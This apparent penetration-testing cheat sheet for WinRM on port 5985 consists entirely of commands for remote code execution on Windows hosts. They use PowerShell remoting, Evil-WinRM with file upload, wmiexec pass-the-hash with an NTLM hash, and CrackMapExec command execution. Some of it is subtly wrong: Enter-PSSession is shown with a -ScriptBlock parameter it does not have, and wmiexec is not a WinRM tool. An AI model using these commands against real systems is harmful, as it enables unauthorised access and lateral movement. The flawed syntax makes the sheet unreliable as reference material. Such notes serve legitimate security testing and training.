# 5985 - PowerShell remoting

## Using PowerShell

```powershell
Enter-PSSession -ComputerName COMPUTERNAME -Credential DOMAIN/USERNAME
Enter-PSSession -ComputerName COMPUTERNAME -Credential DOMAIN/USERNAME -ScriptBlock {hostname;whoami,ipconfig}
```
## Using Evil-WinRM

```bash
sudo gem install evil-winrm
evil-winrm -u USERNAME -p PASSWORD -i RHOST
> upload FILENAME
```

## Using WMIExec

```bash
python3 wmiexec.py -hashes NTLMHASH USERNAME@RHOST
```

## Using CrackMapExec

```bash
crackmapexec winrm RHOST -u USERNAME -p PASSWORD
crackmapexec winrm RHOST -u USERNAME -p PASSWORD -X "COMMAND"
```

